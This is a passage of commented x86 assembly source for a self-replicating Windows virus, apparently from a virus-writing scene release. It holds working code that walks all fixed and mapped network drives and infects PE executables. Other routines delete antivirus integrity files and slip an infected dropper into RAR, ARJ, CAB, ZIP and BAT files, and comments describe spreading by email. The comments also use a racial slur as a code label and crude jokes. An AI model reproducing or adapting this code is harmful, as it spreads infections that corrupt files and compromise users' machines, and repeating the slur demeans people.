   ; the eyes of the user. It will search for files in all the existing drives
   ; from C:\ to Z:\, the drives that have attribute of FIXED (normal HD) or
   ; remote (LAN that are mapped - usually happens). It will search for files
   ; in all the directories/subdirectories without discrimination. This makes it
   ; to be really infectious. Also, we enable here the MAPI functions, so if we
   ; find a HTM? file, we'll search in it for e-mails, and we'll send there an
   ; infected attachment with a fake e-mail (see mail spreading routines). We
   ; prevent the infection of BAT files in root directories, because a file like
   ; AUTOEXEC.BAT or similar will be suspicious if it occupies +100k :) Between
   ; the infetion in one drive and another, it waits 5 seconds. Just for let the
   ; system work fast at least 5 sec :) Btw, the delay of 1 minute is for "let"
   ; the user to connect to internet, LAN, etc :)

   RecursiveSearch proc    d3lt4:DWORD

           mov     ebp,d3lt4                       ; Get delta offset :)

           pushad

           if      debug
           int     3
           else
           push    60000d                          ; Wait 1 minute before party
           apicall Sleep                           ; begins :)
           endif

           lea     esi,[ebp+temp_dir]              ; This is for know in what
           push    esi                             ; unit is the infected file
           push    MAX_PATH                        ; being executed (for return
           apicall GetCurrentDirectoryA            ; to it l8r)

           lea     edi,[ebp+unit]

           mov     dword ptr [edi],"\:C"           ; Set 1st search unit to C:\

   ; We attack DRIVE_FIXED and DRIVE_REMOTE

   DriveLoop:
           push    edi                             ; Check for the kind of unit
           apicall GetDriveTypeA

           cmp     al,DriveRemote                  ; We can infect through local
           jz      attack                          ; nets if drives r mapped
                                                   ; Thnx to Tcp for pointing this
           cmp     al,DriveFixed                   ; We don't want to lose time
           jnz     NextUnit                        ; with non-fixed drives ;)

   attack: push    edi                             ; Set root as current dir
           apicall SetCurrentDirectoryA

       pushad
           mov     byte ptr [ebp+BAT_switch],0C3h
           call    DeleteIntegrityFiles            ; I have to put this also here,
           call    InfectFilesInDirectory          ; or the root directory wont be
           call    payload                         ; infected
           mov     byte ptr [ebp+BAT_switch],090h
       popad

           call    Traversal

           push    5000d                           ; Stop 5 seconds before
           apicall Sleep                           ; changing to the next unit

   NextUnit:
           inc     byte ptr [edi]                  ; Infect all logical drives
           cmp     byte ptr [edi],"Z"              ; from C to Z
           jna     DriveLoop

           push    esi                             ; Restore old directory ;)
           apicall SetCurrentDirectoryA

           popad

           push    00h
           apicall ExitThread
   RecursiveSearch endp

   ; The recursive search in the given unit ;)

   Traversal:
           pushad

       xor     ebx,ebx                         ; Clear counter

   findfirstdir:
           lea     edi,[ebp._WIN32_FIND_DATA]      ; Search for directories
       push    edi
           pushs   "*.*"                           ; We want dirz
           apicall FindFirstFileA

           mov     dword ptr [ebp+TSHandle],eax    ; Save that search handle

           inc     eax
           jz      notfoundfirstdir

   main_trav:
           bt      word ptr [ebp._WFD_dwFileAttributes],4
           jnc     findnextdir                     ; We want only directories
                                                   ; (i don't care about its kind)
           lea     eax,[ebp._WFD_szFileName]

       cmp     byte ptr [eax],"."              ; Is dir "." or ".."?
           jz      findnextdir                     ; Shitz, we don't like it

           push    eax                             ; Set the new directory
           apicall SetCurrentDirectoryA

   ; Action to do in each directory comes here ;)

       pushad
           call    DeleteIntegrityFiles            ; Mmmmm... kewl
           call    InfectFilesInDirectory          ; Of course ;)
       popad

   ; Till here :P

       push    dword ptr [ebp+TSHandle]        ; Save handle
       inc     ebx                             ; Increase counter :)
       jmp     findfirstdir
   findnextdir:
       push    edi                             ; Search for another dir
       push    dword ptr [ebp+TSHandle]
           apicall FindNextFileA

           or      eax,eax                         ; If fail, return back to
           jnz     main_trav                       ; previous directory

   notfoundfirstdir:
           pushs   ".."                            ; Set previous directory
           apicall SetCurrentDirectoryA            ; (dot-dot rlz!)

       or      ebx,ebx                         ; Are we in root? yeah, it's
           jz      nomoretosearch                  ; over! our search finished!

       dec     ebx                             ; Decrease countah
       pop     dword ptr [ebp+TSHandle]
       jmp     findnextdir

   notfoundnextdir:
           push    dword ptr [ebp+TSHandle]        ; Ohhhhh yes... cumshot! :)~
           apicall FindClose
       jmp     notfoundfirstdir

   nomoretosearch:
           popad
       ret

           db      0BBh                            ; Mmmm... this is interesting

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % PE infection                                                            %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   ; This is a very improved version of my PE infection routines. Basically,it's
   ; dessigned for work under all platforms, and it still lacks some stuff not
   ; really needed in my eyes (preserving old file time/date, noone cares!). It
   ; will work in Win2k without errors (tested) because we avoid the SFC prote-
   ; cted files on purpose. It handles also the incurability of the virus, that
   ; was already explained in the first lines of the virus. Well, the virus acts
   ; depending of the existence of .reloc section. If it exist, the virus will
   ; generate a random 6 chars name - ".??????",0,0 (? is a random char), and
   ; will overwrite that section with the virus code. If it doesn't exist, we
   ; infect by means of increasing the last section. Also, if the file has the
   ; checksum field with a non-zero value (means that it uses checksum!), we
   ; calculate the new checksum after-infection. This is useful for infect some
   ; system archives in NT/2k systems.

   InfectPE:
           cmp     dword ptr [ebp+SfcIsFileProtected],00h
           jz      NotInWin2k                      ; Avoid this :P

   ; Win2k/WinME specific routine

           push    edi                             ; See if file is protected
           push    00h                             ; with SFC functions
           apicall SfcIsFileProtected

           or      eax,eax                         ; If so, don't infect
           jnz     ExitInfectPE

   NotInWin2k:
           push    edi
           apicall GetFileAttributesA
           mov     dword ptr [ebp+OldAttr],eax
           mov     dword ptr [ebp+InfFile],edi

           push    80h                             ; Destroy hostile attributes
           push    edi
           apicall SetFileAttributesA

           xor     eax,eax                         ; Open file for R/W
       push    eax
       push    eax
           push    03h
       push    eax
       inc     eax
       push    eax
           push    0C0000000h
           push    edi
           apicall CreateFileA

           inc     eax
           jz      ExitInfectPE1
           dec     eax

           mov     dword ptr [ebp+FileHandle],eax  ; Save handle of opened file

           push    eax

           push    00h
           push    eax
           apicall GetFileSize                     ; Get its size
           mov     dword ptr [ebp+OriginalSize],eax
           mov     dword ptr [ebp+NewSize],eax
           pop     ecx
           add     eax,total_size

           push    eax

           xor     ebx,ebx                         ; EBX = 0
           push    ebx
           push    eax                             ; push size
           push    ebx
           push    04h
           push    ebx
           push    ecx                             ; push handle
           apicall CreateFileMappingA

           pop     ecx                             ; ECX = Size to map

           or      eax,eax
           jz      CloseFileExitInfectPE

           mov     dword ptr [ebp+MapHandle],eax

           xor     ebx,ebx
       push    ecx
           push    ebx
           push    ebx
           push    02h
           push    eax
           apicall MapViewOfFile

           or      eax,eax
           jz      UnMap&CloseMap&FileExitInfectPE

           mov     dword ptr [ebp+MapAddress],eax

           mov     esi,[eax+3Ch]
           add     esi,eax

           call    InfectionCheck
           jc      Trunc&UnMap&CloseMap&FileExitInfectPE

           call    PreInfection

           and     dword ptr [ebp+OldEIP],00h
           mov     dword ptr [ebp+PE_ofs],edi

   ; Prepare incurability shit!

           pushad

           mov     eax,[edi.EntrypointRVA]

       mov     esi,edi
           add     esi,SizeOfSectTable-SizeOfSectHeader
   nigger: add     esi,SizeOfSectHeader            ; Ptr to section name ;)
       mov     edx,eax                         ; Put in EDX the original EIP
           sub     edx,[esi.VirtualAddress]        ; Remove the VirtualAddress
           cmp     edx,[esi.VirtualSize]           ; Is EIP pointing to this sec?
       jae     nigger                          ; If not, loop again

           or      [esi.Characteristics],RWX_attributes ; Put sum attributes

           mov     eax,[edi.EntrypointRVA]         ; Let's do this in a safe way
           sub     eax,[edi.CodeRVA]
           add     eax,[esi.PtrToRawData]
           add     eax,dword ptr [ebp+MapAddress]

           xchg    esi,eax                         ; ESI = Ptr to EIP

           call    incurability                    ; 'lo Qozah! :)

           popad

           cmp     dword ptr [esi.SectionName],"ler." ; .reloc check... special
           jnz     ItIsNotReloc                       ; handling if it is.
           cmp     word ptr [esi.SectionName+4],"co"
           jnz     ItIsNotReloc

   ; Infection when .reloc is the last one - OVERWRITE IT!!!!

           push    edi                             ; Build a 6 chars random name
           mov     edi,esi                         ; (without counting the dot
           call    GenerateName                    ; and the null)
           pop     edi

           and     dword ptr [esi.PtrToReloc],00h  ; Clear PointerToRelocations
           and     word ptr [esi.NumOfReloc],00h   ; Clear NumberOfRelocations

           push    dword ptr [esi.PtrToRawData]    ; Where copy virus

           mov     eax,virus_size
           mov     [esi.VirtualSize],eax           ; VirtualSize -> virus size
           mov     ecx,[edi.FileAlignment]         ; ECX = Alignment

           cdq                                     ; Align, sucker
           push    eax
           div     ecx
           pop     eax
           sub     ecx,edx
           add     eax,ecx

           mov     [esi.SizeOfRawData],eax         ; SizeOfRawData -> aligned
                                                   ;                  virus size
           mov     eax,[esi.VirtualAddress]        ; New EIP
           xchg    eax,[edi.EntrypointRVA]         ; Put new EIP and get old one
           add     dword ptr [ebp+OldEIP],eax      ; Save it

           mov     eax,[esi.SizeOfRawData]         ; We must also put this here,
           add     eax,[esi.VirtualAddress]        ; so NT doesn't yell :P
           mov     [edi.SizeOfImage],eax

           pushad

           mov     eax,[esi.PtrToRawData]          ; EDX = Where truncate
           add     eax,[esi.SizeOfRawData]
           mov     ecx,[edi.FileAlignment]

           xor     edx,edx                         ; Align, sucker
           push    eax
           div     ecx
           pop     eax
           sub     ecx,edx
           add     eax,ecx

           mov     dword ptr [ebp+NewSize],eax     ; This is the new size
           popad

           jmp     copy_virus

   ; Infection when .reloc section is not the last one

   ItIsNotReloc:
           mov     edx,[esi.SizeOfRawData]
           mov     eax,edx
           add     edx,[esi.PtrToRawData]

           push    edx

           add     eax,[esi.VirtualAddress]
           xchg    [edi.EntrypointRVA],eax         ; Put new EIP
           add     dword ptr [ebp+OldEIP],eax

           mov     eax,[esi.SizeOfRawData]
           add     eax,total_size
           mov     ecx,[edi.FileAlignment]

           cdq                                     ; Align, sucker
           push    eax
           div     ecx
           pop     eax
           sub     ecx,edx
           add     eax,ecx

           mov     [esi.SizeOfRawData],eax         ; SORD and VS must be equal (!?)
           mov     [esi.VirtualSize],eax           ; ask NT, dude...
           xchg    eax,edx

           mov     eax,[esi.SizeOfRawData]
           add     eax,[esi.VirtualAddress]
           mov     [edi.SizeOfImage],eax

           add     edx,[esi.PtrToRawData]

           cmp     edx,dword ptr [ebp+OriginalSize] ; Check if file size was
           jb      copy_virus                      ; bigger before infection

           mov     dword ptr [ebp+NewSize],edx     ; If not, set the new size
   copy_virus:
           pop     edi

           lea     esi,[ebp+virus_start]           ; Copy the virus to the desi-
           add     edi,dword ptr [ebp+MapAddress]  ; red place (depends of inf.
           push    edi                             ; kind)
           mov     ecx,virus_size
           rep     movsb

           pop     edi                             ; Prepare the parameters for
           mov     esi,edi                         ; MMXE v1.2
           add     esi,LIMIT
       mov     ecx,virus_size-LIMIT
           call    mmxe                            ; Build poly layer

   ; Let's make it work in WinNT and Win2k

           push    CheckSum
           pop     ebx
           add     ebx,12345678h                   ; EBX = Points to PE CheckSum
   PE_ofs  =       $-4

           cmp     dword ptr [ebx],00h             ; If no CheckSum, no fun :)
           jz      Trunc&UnMap&CloseMap&FileExitInfectPE

           push    ebx                             ; Pointer to CheckSum field
           call    n4t4s
           dd      ?                               ; Where store old CheckSum
   n4t4s:  push    dword ptr [ebp+NewSize]
           push    dword ptr [ebp+MapAddress]
           apicall CheckSumMappedFile

   ; Ok, we close the file, and play a bit with it

   Trunc&UnMap&CloseMap&FileExitInfectPE:
           push    dword ptr [ebp+MapAddress]      ; File should be better
           apicall UnmapViewOfFile                 ; unmapped for trunc it as we
                                                   ; want to...
           push    dword ptr [ebp+MapHandle]
           apicall CloseHandle

           push    00h
           push    00h
           push    dword ptr [ebp+NewSize]
           push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

           push    dword ptr [ebp+FileHandle]
           apicall SetEndOfFile
           jmp     CloseFileExitInfectPE

   UnMap&CloseMap&FileExitInfectPE:
           push    dword ptr [ebp+MapAddress]
           apicall UnmapViewOfFile

   CloseMap&FileExitInfectPE:
           push    dword ptr [ebp+MapHandle]
           apicall CloseHandle

   CloseFileExitInfectPE:
           push    dword ptr [ebp+FileHandle]
           apicall CloseHandle

   ExitInfectPE1:
           push    12345678h
   OldAttr =       $-4
           push    12345678h
   InfFile =       $-4
           apicall SetFileAttributesA

   ExitInfectPE:
           ret

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Archive & BAT infection                                                 %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   ; Here comes the generic code for prepare the infection of several archive
   ; formats. Well, this part simply creates a dropper infected by the virus,
   ; and puts it into some temporally allocated memory, fills some variables
   ; used later by the virus, and calls the apropiated routine depending of the
   ; extension of the file :)
   ;
   ; Thanx again to Int13h, Prizzy and StarZer0.

   InfectArchive:
           call    ReleaseDropper

           lea     edi,[ebp+TemporalFile]

           xor     eax,eax                         ; Open file for R/W
       push    eax
       push    eax
           push    03h
       push    eax
       inc     eax
       push    eax
           push    0C0000000h
           push    edi
           apicall CreateFileA

           inc     eax
           jz      ExitInfectArchive
           dec     eax

           mov     dword ptr [ebp+FileHandle],eax  ; Save handle of opened file

           push    dword ptr [ebp+DropperSize]
           push    00h
           apicall GlobalAlloc

           mov     dword ptr [ebp+GlobalAllocHnd2],eax

       or      eax,eax
           jz      ExitInfectArchive

       push    00h
       lea     ebx,[ebp+NumBytesRead]
       push    ebx
           push    dword ptr [ebp+DropperSize]
       push    eax
       push    dword ptr [ebp+FileHandle]
           apicall ReadFile

       push    dword ptr [ebp+FileHandle]
           apicall CloseHandle

           lea     edi,[ebp.WFD_szFileName]

       push    80h
           push    edi
           apicall SetFileAttributesA              ; Wipe its attributes

           xor     eax,eax                         ; Open file for R/W
       push    eax
       push    eax
           push    03h
       push    eax
       inc     eax
       push    eax
           push    0C0000000h
           push    edi
           apicall CreateFileA

           inc     eax
           jz      ExitInfectArchive
           dec     eax

           mov     dword ptr [ebp+FileHandle],eax  ; Save handle of opened file

           mov     ecx,12345678h
   extension =     $-4
           not     ecx

           cmp     ecx,not "rar."
           jz      InfectRAR
           cmp     ecx,not "jra."
           jz      InfectARJ
           cmp     ecx,not "bac."
           jz      InfectCAB
           cmp     ecx,not "piz."
           jz      InfectZIP
           cmp     ecx,not "tab."
           jz      InfectBAT

           jmp     ExitInfectArchive

   ; Û RAR INFECTION Û

   InfectRAR:
       push    00h                             ; See if it was previously
       push    00h                             ; infected...
           mov     eax,dword ptr [ebp+WFD_nFileSizeLow]
           sub     eax,dword ptr [ebp+DropperSize]
       sub     eax,sRARHeaderSize
       push    eax
       push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

       inc     eax
           jz      LetsInfectRAR
       dec     eax

       push    00h
       lea     ebx,[ebp+NumBytesRead]
       push    ebx
       push    50d
       lea     ebx,[ebp+ArchiveBuffer]
       push    ebx
       push    dword ptr [ebp+FileHandle]
           apicall ReadFile

       or      eax,eax
           jz      LetsInfectRAR

           cmp     word ptr [ebp+ArchiveBuffer+14h],arc_mark
           jz      ExitInfectArchive

   LetsInfectRAR:
           lea     edi,[ebp+RARName]
           call    GenerateName

           mov     edi,dword ptr [ebp+DropperSize]
       mov     dword ptr [ebp+RARCompressed],edi
       mov     dword ptr [ebp+RAROriginal],edi
           mov     esi,dword ptr [ebp+GlobalAllocHnd2]
       call    CRC32

       mov     dword ptr [ebp+RARCrc32],eax

       lea     esi,[ebp+RARHeader+2]
           push    sRARHeaderSize-2
           pop     edi
       call    CRC32

       mov     word ptr [ebp+RARHeaderCRC],ax

       push    02h
       push    00h
       push    00h
       push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

       push    00h
       lea     ebx,[ebp+iobytes]
       push    ebx
       push    sRARHeaderSize
       lea     ebx,[ebp+RARHeader]
       push    ebx
       push    dword ptr [ebp+FileHandle]
           apicall WriteFile

       push    00h
       lea     ebx,[ebp+iobytes]
       push    ebx
           push    dword ptr [ebp+DropperSize]
           push    dword ptr [ebp+GlobalAllocHnd2]
       push    dword ptr [ebp+FileHandle]
           apicall WriteFile

           jmp     ExitInfectArchive

   ; Û ARJ INFECTION Û

   InfectARJ:
       push    00h                             ; Let's see if it was infected
       push    00h
           mov     eax,dword ptr [ebp+WFD_nFileSizeLow]
           sub     eax,dword ptr [ebp+DropperSize]
       sub     eax,sARJTotalSize+4
       push    eax
       push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

           inc     eax
       jz      TryToInfectARJ
       dec     eax

       push    00h
       lea     ebx,[ebp+NumBytesRead]
       push    ebx
       push    50d
       lea     ebx,[ebp+ArchiveBuffer]
       push    ebx
       push    dword ptr [ebp+FileHandle]
           apicall ReadFile

       or      eax,eax
       jz      TryToInfectARJ

       cmp     word ptr [ebp+ArchiveBuffer],0EA60h
           jnz     ExitInfectArchive

           cmp     word ptr [ebp+ArchiveBuffer+0Ch],arc_mark
           jz      ExitInfectArchive

   ; Let's fill properly ARJ fields :)

   TryToInfectARJ:
       lea     edi,[ebp+ARJFilename]
       call    GenerateName

       push    02h
       push    00h
       push    00h
       push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

       xchg    ecx,edx
       mov     edx,eax
       sub     edx,4
       sbb     ecx,1
           inc     ecx

       push    00h
       push    00h
       push    edx
       push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

           mov     edi,dword ptr [ebp+DropperSize]
       mov     dword ptr [ebp+ARJCompress],edi
       mov     dword ptr [ebp+ARJOriginal],edi
           mov     esi,dword ptr [ebp+GlobalAllocHnd2]
       call    CRC32
       mov     dword ptr [ebp+ARJCRC32],eax

       push    00h
       lea     ebx,[ebp+iobytes]
       push    ebx
       push    sARJHeader
       lea     ebx,[ebp+ARJHeader]
       push    ebx
       push    dword ptr [ebp+FileHandle]
           apicall WriteFile

       lea     esi,[ebp+ARJHSmsize]
       mov     edi,sARJCRC32Size
       call    CRC32

       mov     dword ptr [ebp+ARJHeaderCRC],eax

       push    00h
       lea     ebx,[ebp+iobytes]
       push    ebx
       push    sARJSecondSide
       lea     ebx,[ebp+ARJSecondSide]
       push    ebx
       push    dword ptr [ebp+FileHandle]
           apicall WriteFile

       push    00h
       lea     ebx,[ebp+iobytes]
       push    ebx
           push    dword ptr [ebp+DropperSize]
           push    dword ptr [ebp+GlobalAllocHnd2]
       push    dword ptr [ebp+FileHandle]
           apicall WriteFile

       push    00h
       lea     ebx,[ebp+iobytes]
       push    ebx
       push    04h
           call    ovahit
           db      60h,0EAh,00h,00h                ; Close it :)
   ovahit: push    dword ptr [ebp+FileHandle]
           apicall WriteFile
           jmp     ExitInfectArchive

   ; This routine was translated from the unreadable Prizzy's code :)

   ; Û CAB INFECTION Û

   InfectCAB:
           push    00h                             ; Get the size of the CAB file
           push    dword ptr [ebp+FileHandle]
           apicall GetFileSize
           mov     dword ptr [ebp+FS_CAB],eax

           mov     eax,dword ptr [ebp+DropperSize]
           add     eax,(CABCompr_data-CABdirectory_start)
           mov     dword ptr [ebp+DFS_CAB],eax

           add     eax,50000                       ; bugfix (!)
           push    eax
           push    00h
           apicall GlobalAlloc

           mov     dword ptr [ebp+GA_CAB],eax

           mov     eax,10000h
           mov     dword ptr [ebp+FHS_CAB],eax     ; If the file is bigger than
           cmp     dword ptr [ebp+FS_CAB],eax      ; 65535 bytes, we only read
           ja      ReadCABinet                     ; those 65535 bytes, not the
           mov     eax,dword ptr [ebp+FS_CAB]      ; whole file.
           mov     dword ptr [ebp+FHS_CAB],eax

   ReadCABinet:
           mov     edi,dword ptr [ebp+GA_CAB]

       push    00h
       lea     ebx,[ebp+NumBytesRead]
       push    ebx
           push    dword ptr [ebp+FHS_CAB]
           push    edi
       push    dword ptr [ebp+FileHandle]
           apicall ReadFile

           cmp     dword ptr [edi],"FCSM"          ; Check if it's a CAB :)
           jnz     ErrorCAB

           cmp     word ptr [edi+18h],0103h        ; Check for version
           jnz     ErrorCAB

           cmp     word ptr [edi+22h],00h          ; Check for volume
           jnz     ErrorCAB

           mov     eax,dword ptr [ebp+DropperSize] ; Oh yeah :)
           mov     dword ptr [ebp+CABUnCompSize],eax
           mov     word ptr [ebp+CABUnCompr],ax
           mov     word ptr [ebp+CABCompr],ax

           pushad                                  ; Generate a random 8 bytes
           push    08h                             ; name for the executable
           pop     ecx                             ; with the virus :)
           lea     edi,[ebp+CABFileName]
           call    GenNameX
           popad

           movzx   esi,word ptr [edi+10h]
           add     esi,dword ptr [ebp+GA_CAB]      ; ESI points to file_start part

           cmp     word ptr [esi+0Ch],arc_mark     ; Check if we've already
           jz      ErrorCAB                        ; infected it

           mov     word ptr [esi+0Ch],arc_mark     ; Mark as infected so

           push    esi
           movzx   ebx,word ptr [edi+1Ah]
   modifyCAB:
           or      ebx,ebx
           jz      SC0
           sub     esi,8
           add     dword ptr [esi],25h
           dec     ebx
           jmp     modifyCAB
   SC0:    pop     esi

           push    edi
           mov     edi,esi
           scasd                                   ; add edi,8
           scasd
           mov     ecx,dword ptr [ebp+GA_CAB]
           add     ecx,dword ptr [ebp+FHS_CAB]
           sub     ecx,esi
           call    __movsd_back
           pop     edi
           lodsd                                   ; add esi,4
           mov     dword ptr [ebp+FLD_CAB],esi

           movzx   ebx,word ptr [edi+1Ch]
           push    ebx
           call    random
           xor     edx,edx
           mov     ecx,ebx
           div     ecx
           inc     edx
           push    edx
           lodsd                                   ; add esi,8
           lodsd

           push    edi
           mov     edi,esi
   SearchCAB:
           or      edx,edx
           jz      SC1
           add     edi,10h

           xor     ecx,ecx
           dec     ecx
           xor     al,al
           repnz   scasb

           dec     edx
           jmp     SearchCAB

   SC1:    mov     esi,edi
           pop     edi

           mov     dx,[edi+1Ah]

           push    edi
           mov     edi,esi
           add     edi,(CABentry-CABfile_start)
           mov     ecx,dword ptr [ebp+FHS_CAB]
           add     ecx,dword ptr [ebp+GA_CAB]
           sub     ecx,esi
           call    __movsd_back

           lodsd                                   ; add esi,4

           mov     edi,esi
           lea     esi,[ebp+CABfile_start]

           mov     word ptr [esi+08h],dx
           push    (CABentry-CABfile_start)
           pop     ecx
           rep     movsb

           mov     esi,edi
           pop     edi
           pop     edx
           pop     ebx

           sub     ebx,edx
           push    edi
           mov     edi,esi
   SearchCAB2:
           or      ebx,ebx
           jz      SC2
           add     edi,10h

           xor     ecx,ecx
           dec     ecx

           xor     al,al
           repnz   scasb
           dec     ebx
           jmp     SearchCAB2

   SC2:    mov     esi,edi
           pop     edi

           inc     word ptr [edi+1Ah]
           inc     word ptr [edi+1Ch]
           add     dword ptr [edi+08h],12345678h
   DFS_CAB =       $-4
           add     dword ptr [edi+10h],08h

           sub     esi,dword ptr [ebp+GA_CAB]

           mov     ecx,dword ptr [ebp+FS_CAB]
           sub     ecx,esi
           add     ecx,dword ptr [ebp+DropperSize]
           add     ecx,1000h                       ; For security (!)

           push    ecx
           push    00h
           apicall GlobalAlloc

           mov     dword ptr [ebp+GA2_CAB],eax

           mov     edi,dword ptr [ebp+FLD_CAB]
           mov     eax,dword ptr [ebp+FS_CAB]
           add     eax,(CABentry-CABdirectory_start)
           mov     [edi],eax
           mov     word ptr [edi+04h],01h
           mov     word ptr [edi+06h],00h

   ; Aprendiendo a luchaaaaaaaaar!!!!

           push    00h
           push    00h
           mov     eax,esi
           sub     eax,(CABentry-CABdirectory_start)
           push    eax
           push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

           push    00h
           lea     ebx,[ebp+iobytes]
           push    ebx
           mov     eax,dword ptr [ebp+FS_CAB]
           sub     eax,esi
           add     eax,(CABentry-CABdirectory_start)
           push    eax
           push    dword ptr [ebp+GA2_CAB]
           push    dword ptr [ebp+FileHandle]
           apicall ReadFile

           push    esi
           mov     edi,dword ptr [ebp+GA2_CAB]
           add     edi,dword ptr [ebp+FS_CAB]
           sub     edi,esi
           add     edi,(CABentry-CABdirectory_start)

           lea     esi,[ebp+CABentry]
           push    (CABCompr_data-CABentry)
           pop     ecx
           rep     movsb

           mov     esi,dword ptr [ebp+GlobalAllocHnd2]
           mov     ecx,dword ptr [ebp+DropperSize]
           rep     movsb
           pop     esi

           push    00h
           push    00h
           push    00h
           push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

           push    00h
           lea     ebx,[ebp+iobytes]
           push    ebx
           push    esi
           push    dword ptr [ebp+GA_CAB]
           push    dword ptr [ebp+FileHandle]
           apicall WriteFile

           push    00h
           push    00h
           push    esi
           push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

           push    00h
           lea     ebx,[ebp+iobytes]
           push    ebx
           mov     eax,dword ptr [ebp+FS_CAB]
           sub     eax,esi
           add     eax,CABCompr_data-CABdirectory_start
           add     eax,dword ptr [ebp+DropperSize]
           push    eax
           push    dword ptr [ebp+GA2_CAB]
           push    dword ptr [ebp+FileHandle]
           apicall WriteFile

           push    12345678h
   GA2_CAB =       $-4
           apicall GlobalFree

   ErrorCAB:
           push    12345678h
   GA_CAB  =       $-4
           apicall GlobalFree
           jmp     ExitInfectArchive

   ; Û ZIP INFECTION Û

   InfectZIP:
           push    00h                             ; Get the size of the ZIP file
           push    dword ptr [ebp+FileHandle]
           apicall GetFileSize
           mov     dword ptr [ebp+FS_ZIP],eax

           add     eax,dword ptr [ebp+DropperSize]
           add     eax,1Eh+9+2Eh+9

           push    eax                             ; Allocate lotsa mem!
           push    00h
           apicall GlobalAlloc
           or      eax,eax
           jz      ExitInfectArchive

           mov     dword ptr [ebp+GA_ZIP],eax

       push    00h
       lea     ebx,[ebp+NumBytesRead]
       push    ebx
           push    12345678h
   FS_ZIP  =       $-4
           push    dword ptr [ebp+GA_ZIP]
       push    dword ptr [ebp+FileHandle]
           apicall ReadFile

           mov     edi,dword ptr [ebp+GA_ZIP]
           cmp     word ptr [edi],"KP"             ; Look for mark
           jnz     ExitInfZIP

           cmp     word ptr [edi+0Ah],arc_mark
           jz      ExitInfZIP

           mov     word ptr [edi+0Ah],arc_mark     ; Mark it.

           push    edi
           push    edi
           add     edi,dword ptr [ebp+FS_ZIP]
           push    edi
   de0:    dec     edi
           cmp     dword ptr [edi],06054B50h       ; Get EndOfCentral
           jnz     de0

           movzx   ecx,word ptr [edi+14h]
           add     ecx,16h
           mov     esi,edi
           add     esi,ecx

           pop     edi
           add     edi,1Eh+9+2Eh+9
           add     edi,dword ptr [ebp+DropperSize]

           std
           inc     ecx
           repz    movsb
           pop     esi

           inc     edi

           add     esi,dword ptr [edi+10h]
           push    esi
           mov     ecx,dword ptr [edi+0Ch]
           add     esi,ecx

           sub     edi,2Eh+9
           push    edi
           inc     ecx
           repz    movsb
           cld
           inc     edi
           inc     esi

           mov     dword ptr [ebp+ND_ZIP],edi
           pop     edi

           push    esi
           push    edi
           push    2Eh+9
           pop     ecx
           repz    movsb

           pushad                                  ; Get CRC32 of the dropper
           mov     edi,dword ptr [ebp+DropperSize]
           mov     esi,dword ptr [ebp+GlobalAllocHnd2]
       call    CRC32
           mov     dword ptr [ebp+CRC32_ZIP],eax
           popad

           pop     esi
           pop     ecx
           sub     ecx,dword ptr [ebp+GA_ZIP]

           and     dword ptr [esi+08h],00h
           mov     dword ptr [esi+10h],12345678h
   CRC32_ZIP =     $-4

           mov     eax,dword ptr [ebp+DropperSize]
           mov     dword ptr [esi+14h],eax
           mov     dword ptr [esi+18h],eax

           mov     dword ptr [esi+2Ah],ecx

           mov     word ptr [esi+01Ch],09h
           and     dword ptr [esi+1Eh],00h

           pushad
           lea     edi,[esi+2Eh]                   ; Generate a random 4 char name
           push    04h
           pop     ecx
           call    GenNameX
           popad
           push    dword ptr [esi+2Eh]

           mov     dword ptr [esi+2Eh+4],"EXE."
           mov     byte ptr [esi+2Eh+8],00h

           mov     ecx,12345678h
   ND_ZIP  =       $-4
           sub     ecx,dword ptr [ebp+GA_ZIP]

           mov     dword ptr [esi+2Eh+9+010h],ecx
           add     dword ptr [esi+2Eh+9+0Ch],2Eh+9
           inc     word ptr [esi+2Eh+9+08h]
           inc     word ptr [esi+2Eh+9+0Ah]

           pop     eax                             ; EAX = Name of dropper

           pop     edi
           pop     esi

           push    1Eh+9
           pop     ecx
           repz    movsb

           mov     dword ptr [edi-9],eax
           mov     dword ptr [edi-5],"EXE."
           mov     byte ptr [edi-1],0

           mov     dword ptr [edi-9-1Eh+06h],80h
           mov     dword ptr [edi-9-1Eh+1Ah],09h

           mov     eax,dword ptr [ebp+CRC32_ZIP]
           mov     dword ptr [edi-9-1Eh+0Eh],eax

           mov     ecx,dword ptr [ebp+DropperSize]
           mov     dword ptr [edi-9-1Eh+12h],ecx
           mov     dword ptr [edi-9-1Eh+16h],ecx
           mov     dword ptr [edi-9-1Eh],04034B50h
           mov     word ptr [edi-9-1Eh+04h],10d

           mov     esi,dword ptr [ebp+GlobalAllocHnd2]
           mov     ecx,dword ptr [ebp+DropperSize]
           rep     movsb

   ; ECX = 0

           push    ecx                             ; Whatta silly bug i had :)
           push    ecx                             ; Thanx S0!
           push    ecx
       push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

           mov     ecx,dword ptr [ebp+DropperSize]
           add     ecx,dword ptr [ebp+FS_ZIP]
           add     ecx,1Eh+9+2Eh+9h

           push    00h
           lea     ebx,[ebp+iobytes]
           push    ebx
           push    ecx
           push    dword ptr [ebp+GA_ZIP]
           push    dword ptr [ebp+FileHandle]
           apicall WriteFile

   ExitInfZIP:
           push    12345678h
   GA_ZIP  =       $-4
           apicall GlobalFree

           jmp     ExitInfectArchive

   ; Global end of all archive infections :)

   ExitInfectArchive:
           push    dword ptr [ebp+GlobalAllocHnd2]
           apicall GlobalFree

           push    dword ptr [ebp+FileHandle]
           apicall CloseHandle

           call    KillDropper
           ret

